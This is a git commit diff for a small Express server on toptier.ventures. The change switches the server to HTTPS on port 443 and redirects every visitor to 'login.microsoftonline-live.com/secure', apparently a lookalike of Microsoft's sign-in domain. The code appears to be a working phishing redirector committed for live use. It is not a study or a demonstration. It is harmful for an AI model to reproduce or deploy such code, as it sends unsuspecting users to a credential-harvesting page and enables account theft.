616c850569b9d390059dfeb7c5c54162845e3e95
scottmahony <158554772+scottmahony@users.noreply.github.com>
2024-06-12 17:51:20 -0700

    Update app.js

--- app.js
+++ app.js
@@ -1,16 +1,23 @@
+const fs = require('fs');
+const https = require('https');
 const express = require('express');
-const { createProxyMiddleware } = require('http-proxy-middleware');
 
 const app = express();
-const port = 3001;
+
+const privateKey = fs.readFileSync('/etc/letsencrypt/live/toptier.ventures/privkey.pem', 'utf8');
+const certificate = fs.readFileSync('/etc/letsencrypt/live/toptier.ventures/fullchain.pem', 'utf8');
+const credentials = { key: privateKey, cert: certificate };
+
+const port = 443; // Standard HTTPS port
 
 app.get('/', (req, res) => {
-  console.log(`Accessed via: ${req.hostname}`); // Logs the domain name
   setTimeout(() => {
-      res.redirect('https://login.microsoftonline-live.com/secure');
+    res.redirect('https://login.microsoftonline-live.com/secure');
   }, 10);
 });
 
-app.listen(port, '0.0.0.0', () => {
-  console.log(`Proxy server listening at http://www.toptier.ventures:${port}`);
+const httpsServer = https.createServer(credentials, app);
+
+httpsServer.listen(port, '0.0.0.0', () => {
+  console.log(`Proxy server listening at https://www.toptier.ventures`);
 });
